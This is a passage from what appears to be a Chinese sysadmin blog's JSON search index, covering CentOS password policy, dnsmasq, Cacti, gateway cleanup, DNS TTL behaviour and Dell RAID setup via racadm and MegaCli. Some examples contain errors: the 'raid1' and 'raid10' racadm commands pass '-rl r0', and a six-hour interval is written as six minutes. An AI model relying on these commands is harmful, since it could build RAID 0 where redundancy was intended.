https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-devel-6.1.0-1.el7.elrepo.x86_64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"升级CentOS7的kernel核心"},{"content":"各种合规要求中都对用户策略有着要求，什么PCI啊，上市审计啊，都有着密码复杂程度的要求：\nCentOS 7 的用户密码策略：\n修改vi /etc/pam.d/system-auth\n其中有一行：\npassword requisite pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type= 后面加上：\nminlen=12 lcredit=-1 ucredit=-1 dcredit=-1 ocredit=-1 enforce_for_root 修改成为：\npassword requisite pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type= minlen=12 lcredit=-1 ucredit=-1 dcredit=-1 ocredit=-1 enforce_for_root 意思是：\n密码长度12，须包含：一个小写字符，一个大写字符，一个数字，一个特殊字符，强制root也遵守此规则 参数全部解释如下：\nretry=3: This option will prompt the user 3 times before exiting and returning an error. minlen=12: This specifies that the password cannot be less than 12 characters. maxrepeat=3: This allows implies that only a maximum of 3 repeated characters can be included in the password. ucredit=-1: The option requires at least one uppercase character in the password. lcredit=-1: The option requires at least one lowercase character in the password. dcredit=-1: This implies that the password should have at last a numeric character. ocredit=-1: The option requires at least one special character included in the password. difok=3: This implies that only a maximum of 3 character changes in the new password should be present in the old password. reject_username: The option rejects a password if it consists of the username either in its normal way or in reverse. enforce_for_root: This ensures that the password policies are adhered to even if it’s the root user configuring the passwords. ","permalink":"https://rendoumi.com/posts/20221218-centos7_passwd/","summary":"\u003cp\u003e各种合规要求中都对用户策略有着要求，什么PCI啊，上市审计啊，都有着密码复杂程度的要求：\u003c/p\u003e\n\u003cp\u003eCentOS 7 的用户密码策略：\u003c/p\u003e\n\u003cp\u003e修改vi /etc/pam.d/system-auth\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-centos7_passwd/2021-01-28_104150.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中有一行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epassword    requisite     pam_pwquality.so try_first_pass local_users_only \u003cspan class=\"nv\"\u003eretry\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e \u003cspan class=\"nv\"\u003eauthtok_type\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e后面加上：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eminlen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e12\u003c/span\u003e \u003cspan class=\"nv\"\u003elcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003eucredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003edcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003eocredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 enforce_for_root\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e修改成为：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epassword    requisite     pam_pwquality.so try_first_pass local_users_only \u003cspan class=\"nv\"\u003eretry\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e \u003cspan class=\"nv\"\u003eauthtok_type\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003eminlen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e12\u003c/span\u003e \u003cspan class=\"nv\"\u003elcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003eucredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003edcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003eocredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 enforce_for_root\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e意思是：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e密码长度12，须包含：一个小写字符，一个大写字符，一个数字，一个特殊字符，强制root也遵守此规则\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e参数全部解释如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eretry\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3: This option will prompt the user \u003cspan class=\"m\"\u003e3\u003c/span\u003e \u003cspan class=\"nb\"\u003etimes\u003c/span\u003e before exiting and returning an error.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eminlen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e12: This specifies that the password cannot be less than \u003cspan class=\"m\"\u003e12\u003c/span\u003e characters.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emaxrepeat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3: This allows implies that only a maximum of \u003cspan class=\"m\"\u003e3\u003c/span\u003e repeated characters can be included in the password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eucredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1: The option requires at least one uppercase character in the password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1: The option requires at least one lowercase character in the password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1: This implies that the password should have at last a numeric character.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eocredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1: The option requires at least one special character included in the password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edifok\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3: This implies that only a  maximum of \u003cspan class=\"m\"\u003e3\u003c/span\u003e character changes in the new password should be present in the old password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereject_username: The option rejects a password \u003cspan class=\"k\"\u003eif\u003c/span\u003e it consists of the username either in its normal way or in reverse.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenforce_for_root: This ensures that the password policies are adhered to even \u003cspan class=\"k\"\u003eif\u003c/span\u003e it’s the root user configuring the passwords.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"合规要求之CentOS7的用户密码策略"},{"content":"一：介绍： DNSMasq主要用来解决内网DNS域名缓存、DHCP、网络启动和路由通告功能，我们主要是将DNSMasq作为内网DNS域名劫持使用\n系统环境：centos7.6 需求：一个域名对应多个ip 主机ip：（内网主机172.18.30.1和172.18.30.2）\n二：配置方法 1，添加如下配置到/etc/dnsmasq.conf addn-hosts=/etc/ty.ddky.local\naddn-hosts：如果要支持一个域名对应多个 IP，就必须用 addn-hosts 选项\n2，/etc/ty.ddky.local 文件内容如下： 172.18.33.100 ty.ddky.local 172.18.33.104 ty.ddky.local\n3，修改完成后重启 DNSMasq systemctl restart dnsmasq.service\n","permalink":"https://rendoumi.com/posts/20221219-dnsmqsq_multi_ip/","summary":"\u003cp\u003e一：介绍：\nDNSMasq主要用来解决内网DNS域名缓存、DHCP、网络启动和路由通告功能，我们主要是将DNSMasq作为内网DNS域名劫持使用\u003c/p\u003e\n\u003cp\u003e系统环境：centos7.6\n需求：一个域名对应多个ip\n主机ip：（内网主机172.18.30.1和172.18.30.2）\u003c/p\u003e\n\u003cp\u003e二：配置方法\n1，添加如下配置到/etc/dnsmasq.conf\naddn-hosts=/etc/ty.ddky.local\u003c/p\u003e\n\u003cp\u003eaddn-hosts：如果要支持一个域名对应多个 IP，就必须用 addn-hosts 选项\u003c/p\u003e\n\u003cp\u003e2，/etc/ty.ddky.local 文件内容如下：\n172.18.33.100  ty.ddky.local\n172.18.33.104  ty.ddky.local\u003c/p\u003e\n\u003cp\u003e3，修改完成后重启 DNSMasq\nsystemctl restart dnsmasq.service\u003c/p\u003e","title":"Dnsmasq配置一个域名对应多个ip"},{"content":"网络工程师选择网络设备的监控工具是老牌的cacti，当然作为系统工程师的我，还是觉得librenms是个好选择，但是，librenms会对网络设备cpu造成比较大的压力。那还是遵从他的选择，最近网工报告说：\n选择图形的时候时间Filter失效了。选择了以后图形无变化，崩溃，查了一下，都上古的玩意了。\n修改方法：\n修改graph_image.php\nunixtime = 1600000000，也就是到 2020-09-13 20:26:40。放大到 2600000000，也就是到2052-05-22 22:13:20，写这个php程序的人防越界，却没想到时间真的来到了这个节点。\n注：Unix 时间戳是从1970年1月1日（UTC/GMT的午夜）开始所经过的秒数，不考虑闰秒。\n","permalink":"https://rendoumi.com/posts/20221218-cacti_time_filter/","summary":"\u003cp\u003e网络工程师选择网络设备的监控工具是老牌的cacti，当然作为系统工程师的我，还是觉得librenms是个好选择，但是，librenms会对网络设备cpu造成比较大的压力。那还是遵从他的选择，最近网工报告说：\u003c/p\u003e\n\u003cp\u003e选择图形的时候时间Filter失效了。选择了以后图形无变化，崩溃，查了一下，都上古的玩意了。\u003c/p\u003e\n\u003cp\u003e修改方法：\u003c/p\u003e\n\u003cp\u003e修改graph_image.php\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-cacti_time_filter/2021-01-20_190434.png\"\u003e\u003c/p\u003e\n\u003cp\u003eunixtime = 1600000000，也就是到 2020-09-13 20:26:40。放大到 2600000000，也就是到2052-05-22 22:13:20，写这个php程序的人防越界，却没想到时间真的来到了这个节点。\u003c/p\u003e\n\u003cp\u003e注：Unix 时间戳是从1970年1月1日（UTC/GMT的午夜）开始所经过的秒数，不考虑闰秒。\u003c/p\u003e","title":"老版本cacti的图形filter突然失效的解决办法"},{"content":"线上服务器172.18.30.67 有4个网口\n其中eno1和eno2是两个光纤万兆口，enp26s0f0和enp26s0f1是两个以太千兆网口。\neno2网卡在没做bonding的时候，通过NetworkManager的dhcp获得了地址。然后eno1和eno2做了bonding，但是eno2实际还在单独起作用，bonding后地址没去掉，导致有两个网关。路由表如下：\n[root@renhe-18-30-67 ~]# ip r\rdefault via 172.18.29.254 dev eno2 default via 172.18.31.254 dev br0.199 proto static metric 426 172.18.28.0/23 dev eno2 proto kernel scope link src 172.18.28.67 172.18.30.0/23 dev br0.199 proto kernel scope link src 172.18.30.67 metric 426 192.168.122.0/24 dev virbr0 proto kernel scope link src 192.168.122.1 eno2是从dhcp获得了172.18.28.67的地址\nip a\reno2: flags=6211\u0026lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST\u0026gt; mtu 1500\rinet 172.18.28.67 netmask 255.255.254.0 broadcast 172.18.29.255\rether b4:05:5d:08:e0:d8 txqueuelen 1000 (Ethernet)\rRX packets 81768780 bytes 5398659503 (5.0 GiB)\rRX errors 0 dropped 7 overruns 0 frame 0\rTX packets 10044620 bytes 467566304 (445.9 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 这种情况下，处理方法如下：\nbonding的模式是 物理网卡 \u0026ndash;\u0026gt; bond \u0026ndash;\u0026gt; bond.xxx \u0026ndash;\u0026gt;br.xxx\n先查bonding模式:\ncat /sys/class/net/bond0/bonding/mode\ractive-backup 1 再看bonding网卡状态：\ncat /proc/net/bonding/bond0\rEthernet Channel Bonding Driver: v3.7.1 (April 27, 2011)\rBonding Mode: fault-tolerance (active-backup)\rPrimary Slave: eno1 (primary_reselect always)\rCurrently Active Slave: eno1\rMII Status: up\rMII Polling Interval (ms): 100\rUp Delay (ms): 0\rDown Delay (ms): 0\rSlave Interface: eno1\rMII Status: up\rSpeed: 10000 Mbps\rDuplex: full\rLink Failure Count: 1\rPermanent HW addr: b4:05:5d:08:e0:d8\rSlave queue ID: 0\rSlave Interface: eno2\rMII Status: up\rSpeed: 10000 Mbps\rDuplex: full\rLink Failure Count: 1\rPermanent HW addr: b4:05:5d:08:e0:d9\rSlave queue ID: 0 再次确认active\ncat /sys/class/net/bond0/bonding/active_slave\reno1 再确认第二个default网关有效\nping -I br0.199 172.18.31.254 从以上可以确定主网卡是eno1，shutdown了eno2不会影响任何东西。\n接下来的步骤：\n先查出来dhclient的进程号，是2252\n1 2252 2252 2252 ? -1 Ss 0 8:50 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eno2.lease -pf /var/run/dhclient-eno2.pid -H renhe-18-30-67 eno2 然后处理：\nsystemctl stop NetworkManager\rsystemctl disable NetworkManager\r# 杀掉dhclient\rkill -9 2252 这样eno2的ip地址在过一段时间后会消失掉。\n如果不消失：\nip link set eno2 down 然后等等\nip link set eno2 up 就可以了。\n由于是线上服务器，无法停机，所以操作才搞得这么小心谨慎。\n","permalink":"https://rendoumi.com/posts/20221218-multi_gateway/","summary":"\u003cp\u003e线上服务器172.18.30.67 有4个网口\u003c/p\u003e\n\u003cp\u003e其中eno1和eno2是两个光纤万兆口，enp26s0f0和enp26s0f1是两个以太千兆网口。\u003c/p\u003e\n\u003cp\u003eeno2网卡在没做bonding的时候，通过NetworkManager的dhcp获得了地址。然后eno1和eno2做了bonding，但是eno2实际还在单独起作用，bonding后地址没去掉，导致有两个网关。路由表如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[root@renhe-18-30-67 ~]# ip r\r\ndefault via 172.18.29.254 dev eno2 \r\ndefault via 172.18.31.254 dev br0.199 proto static metric 426 \r\n172.18.28.0/23 dev eno2 proto kernel scope link src 172.18.28.67 \r\n172.18.30.0/23 dev br0.199 proto kernel scope link src 172.18.30.67 metric 426 \r\n192.168.122.0/24 dev virbr0 proto kernel scope link src 192.168.122.1\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eeno2是从dhcp获得了172.18.28.67的地址\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eip a\r\neno2: flags=6211\u0026lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST\u0026gt;  mtu 1500\r\n        inet 172.18.28.67  netmask 255.255.254.0  broadcast 172.18.29.255\r\n        ether b4:05:5d:08:e0:d8  txqueuelen 1000  (Ethernet)\r\n        RX packets 81768780  bytes 5398659503 (5.0 GiB)\r\n        RX errors 0  dropped 7  overruns 0  frame 0\r\n        TX packets 10044620  bytes 467566304 (445.9 MiB)\r\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种情况下，处理方法如下：\u003c/p\u003e","title":"线上服务器出现多网关问题的处理"},{"content":"114.114.114.114 这个DNS修改记录等待的生效时间非常的长，远远超出了TTL的时长，基本是你设置TTL时间的6倍。\n这是上次我们割接得到的教训啊。我们要割接m.ddky.com的域名。\n注：在修改m.ddky.com的记录前，已经把ddky.com的m.ddky.com的TTL改成了1分钟，正常的来说，第一轮1分钟内不更新，第二轮2分钟内也应该更新了。\n看下图，在带外机上做的查询，查询的时候8.8.8.8和223.5.5.5都已经生效了，变成了帝联的地址。\n06:06:57 做了查询，去掉小时，06：57定义为起始时间。 一直到 12:22 分还没有变过来，大概 13:00 变过来\n起始 06:57 \u0026ndash; 13:00 ，一共用了6分钟。而TTL是1分钟，所以基本是6倍时间。\n往前推测5月25日的DNS割接，TTL是10分钟，6倍，就是60分钟，基本吻合。\n如果想让DNS尽快生效，TTL改成10秒是极限了。 ","permalink":"https://rendoumi.com/posts/20221218-dns_114/","summary":"\u003cp\u003e114.114.114.114 这个DNS修改记录等待的生效时间非常的长，远远超出了TTL的时长，基本是你设置TTL时间的6倍。\u003c/p\u003e\n\u003cp\u003e这是上次我们割接得到的教训啊。我们要割接m.ddky.com的域名。\u003c/p\u003e\n\u003cp\u003e注：在修改m.ddky.com的记录前，已经把ddky.com的m.ddky.com的TTL改成了1分钟，正常的来说，第一轮1分钟内不更新，第二轮2分钟内也应该更新了。\u003c/p\u003e\n\u003cp\u003e看下图，在带外机上做的查询，查询的时候8.8.8.8和223.5.5.5都已经生效了，变成了帝联的地址。\u003c/p\u003e\n\u003cp\u003e06:06:57 做了查询，去掉小时，06：57定义为起始时间。\n\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_480_1593442420.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_481_1593442678.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_482_1593442695.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_483_1593442708.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_484_1593442728.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一直到 12:22 分还没有变过来，大概 13:00 变过来\u003c/p\u003e\n\u003cp\u003e起始 06:57 \u0026ndash; 13:00 ，一共用了6分钟。而TTL是1分钟，所以基本是6倍时间。\u003c/p\u003e\n\u003cp\u003e往前推测5月25日的DNS割接，TTL是10分钟，6倍，就是60分钟，基本吻合。\u003c/p\u003e\n\u003ch1 id=\"如果想让dns尽快生效ttl改成10秒是极限了\"\u003e如果想让DNS尽快生效，TTL改成10秒是极限了。\u003c/h1\u003e","title":"114dns的ttl超时的教训"},{"content":"首先ssh到idrac去，直接会进入racadm的界面\n我们以2022年最新的dell机器为例，老的机器显示的东西不一致\nssh 10.18.30.104 Password: racadm\u0026gt;\u0026gt; 注意，shell命令有自动补全功能，按两下tab键会自动补\n做raid的全部命令都在storage的子命令下\n一、首先拿到raid卡的名称：\nracadm\u0026gt;\u0026gt;storage get controllers RAID.Slot.1-1 AHCI.Embedded.2-1 AHCI.Embedded.1-1 RAID.Slot.1-1 是Raid卡控制器名称，下面两个是主板内置的，忽略。\n二、然后拿到所有物理盘的名称：\nracadm\u0026gt;\u0026gt;storage get pdisks Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1 Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1 Disk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1 Disk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1 三、看看有没有已经做好的虚拟磁盘\nracadm\u0026gt;\u0026gt;storage get vdisks 显示为空，那我们就可以放心大胆的去做了\n四、划分RAID 根据级别不同，精简过的名令如下：\nracadm storage createvd:\u0026lt;控制器\u0026gt; -rl {r0|r1|r5|r6|r10|r50|r60} -pdkey:\u0026lt;磁盘组，用逗号分割\u0026gt; -rl — Sets the storage level. r0 — storage 0-Striping r1 — storage 1-Mirroring r5 — storage 5-Striping with Parity r6 — storage 6-Striping with Extra Parity r10 — storage 10-Spanned Striping with Mirroring r50 — storage 50-Spanned Striping with Parity r60 — storage 60-Spanned Striping with Extra Parity 给出例子：\n#raid0 racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1 #raid1 racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1 #raid10 racadm storage createvd:RAID.Slot.1-1 -rl r0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1 五、建立job 首先尝试不重启在线建Raid：\nracadm\u0026gt;\u0026gt;jobqueue create RAID.Slot.1-1 --realtime 如果不行，就建立重启的\nracadm\u0026gt;\u0026gt;jobqueue create RAID.Slot.1-1 racadm jobqueue create RAID.Slot.1-1 RAC1024: Successfully scheduled a job. Verify the job status using \u0026#34;racadm jobqueue view -i JID_xxxxx\u0026#34; command. Commit JID = JID_222873363294 六、如果要重启，就重启。能在线建的就不需要重启\nracadm\u0026gt;\u0026gt;serveraction powercycle racadm serveraction powercycle Server power operation successful 补充：\n如果要清理掉Raid卡之前的配置完全重建，命令如下：\nstorage resetconfig:RAID.Slot.1-1 jobqueue create RAID.Slot.1-1 -r pwrcycle -s TIME_NOW -e TIME_NA ","permalink":"https://rendoumi.com/posts/20221219-dell_ssh_raid/","summary":"\u003cp\u003e首先ssh到idrac去，直接会进入racadm的界面\u003c/p\u003e\n\u003cp\u003e我们以2022年最新的dell机器为例，老的机器显示的东西不一致\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh 10.18.30.104\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePassword: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eracadm\u0026gt;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，shell命令有自动补全功能，按两下tab键会自动补\u003c/p\u003e\n\u003cp\u003e做raid的全部命令都在storage的子命令下\u003c/p\u003e\n\u003cp\u003e一、首先拿到raid卡的名称：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eracadm\u0026gt;\u0026gt;storage get controllers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAHCI.Embedded.2-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAHCI.Embedded.1-1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRAID.Slot.1-1 是Raid卡控制器名称，下面两个是主板内置的，忽略。\u003c/p\u003e\n\u003cp\u003e二、然后拿到所有物理盘的名称：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eracadm\u0026gt;\u0026gt;storage get pdisks\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、看看有没有已经做好的虚拟磁盘\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eracadm\u0026gt;\u0026gt;storage get vdisks\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e显示为空，那我们就可以放心大胆的去做了\u003c/p\u003e\n\u003cp\u003e四、划分RAID\n根据级别不同，精简过的名令如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eracadm storage createvd:\u0026lt;控制器\u0026gt; -rl \u003cspan class=\"o\"\u003e{\u003c/span\u003er0\u003cspan class=\"p\"\u003e|\u003c/span\u003er1\u003cspan class=\"p\"\u003e|\u003c/span\u003er5\u003cspan class=\"p\"\u003e|\u003c/span\u003er6\u003cspan class=\"p\"\u003e|\u003c/span\u003er10\u003cspan class=\"p\"\u003e|\u003c/span\u003er50\u003cspan class=\"p\"\u003e|\u003c/span\u003er60\u003cspan class=\"o\"\u003e}\u003c/span\u003e -pdkey:\u0026lt;磁盘组，用逗号分割\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rl — Sets the storage level.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r0 — storage 0-Striping\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r1 — storage 1-Mirroring\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r5 — storage 5-Striping with Parity\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r6 — storage 6-Striping with Extra Parity\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r10 — storage 10-Spanned Striping with Mirroring\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r50 — storage 50-Spanned Striping with Parity\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    r60 — storage 60-Spanned Striping with Extra Parity\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e给出例子：\u003c/p\u003e","title":"Dell服务器用ssh方式划分磁盘Raid的方法"},{"content":"这Megacli是操作磁盘Raid的常用软件，日常用的大多是dell家的机器，都是这软件，记录一下。\n#!/bin/sh #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 /opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 | grep -A1 \u0026#34;Enclosure Device\u0026#34; # clear foreign disk #/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -scan -a0 #/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -clear -a0 # clear Firmware state #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39; #/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv \u0026#34;[32:3]\u0026#34; -a0 # clear Firmware JBOD mode, first turn into unconfig mode, then MakeGood #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep 